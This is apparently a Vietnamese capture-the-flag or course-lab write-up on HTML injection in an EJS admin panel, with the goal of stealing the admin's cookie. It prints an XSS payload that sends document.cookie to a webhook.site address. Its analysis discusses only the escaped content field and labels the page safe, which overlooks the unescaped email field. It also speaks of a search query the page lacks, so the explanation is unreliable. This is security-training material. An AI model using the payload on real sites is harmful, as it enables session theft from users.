# HTML Injection 6

# Thử thách về lỗi bảo mật HTML Injection

# Mục tiêu: Cướp cookie của admin
# Phân tích code:
```html
<!DOCTYPE html>
<html>

<head>
    <title>Quick Note 6</title>
    <style>
        body {
            padding: 50px;
            font: 14px "Lucida Grande", Helvetica, Arial, sans-serif;
        }

        input {
            margin-top: 5px;
            margin-bottom: 5px;
            display: inline-block;
            vertical-align: middle;
            margin-left: 20px
        }

        label {
            display: inline-block;
            padding-top: 5px;
            text-align: left;
            width: 70px;
        }
    </style>
</head>

<body>
    <h1>Quick Note 6 - Admin panel</h1>
    <br>
    <table>
        <tr>
            <td><b>Email</b></td>
            <td><b>Content</b></td>
        </tr>
        <% for(var i in tickets) { %>
            <tr>
                <td>
                    <%- tickets[i].email %>
                </td>
                <td>
                    <%= tickets[i].content %>
                </td>
            </tr>
            <% } %>
    </table>
    <br>
    <a href="/logout">Logout</a>
</body>

</html>
```
- Đoạn code trên là một trang HTML hiển thị danh sách các ticket với email và nội dung của chúng. Tuy nhiên, **việc sử dụng `<%= %>` để hiển thị nội dung của ticket là an toàn**, vì EJS sẽ tự động escape các ký tự đặc biệt (như `<`, `>`, `&`, `"`, `'`). Điều này ngăn chặn việc chèn và thực thi mã HTML hoặc JavaScript độc hại, nên không gây ra lỗ hổng XSS.
- Nếu muốn render HTML hoặc JavaScript trực tiếp (không escape), phải dùng `<%- %>`. Khi đó, nếu dữ liệu không được kiểm tra, sẽ có nguy cơ XSS.
- **Kết luận:** Sử dụng `<%= %>` là an toàn với dữ liệu đầu vào từ người dùng. Chỉ `<%- %>` mới có nguy cơ XSS nếu render dữ liệu không kiểm tra.
# Bước thực hiện
- Để thực hiện HTML Injection, bạn cần gửi một yêu cầu đến trang này với một truy vấn tìm kiếm chứa mã HTML hoặc JavaScript.
- Ví dụ, bạn có thể sử dụng truy vấn tìm kiếm như sau:
```html
<svg onload="fetch('https://webhook.site/3a6cea0c-0c4b-4528-a54e-421553192587?cookie='+document.cookie)">
```
- Khi nạn nhân truy cập vào trang web và mã JavaScript này được thực thi, nó sẽ gửi cookie của nạn nhân đến máy chủ của bạn thông qua một yêu cầu `fetch`.
## Một số lưu ý khi làm bài

- Khi nộp bài, hãy chắc chắn rằng bạn đã xóa tất cả các thông tin nhạy cảm, bao gồm cả cookie, khỏi mã nguồn của mình.
- Không chia sẻ bài làm của mình với người khác, trừ khi bạn chắc chắn rằng họ cũng đang tham gia vào khóa học này.
- Hãy chắc chắn rằng bạn đã đọc và hiểu rõ về các quy định và chính sách của khóa học trước khi bắt đầu làm bài.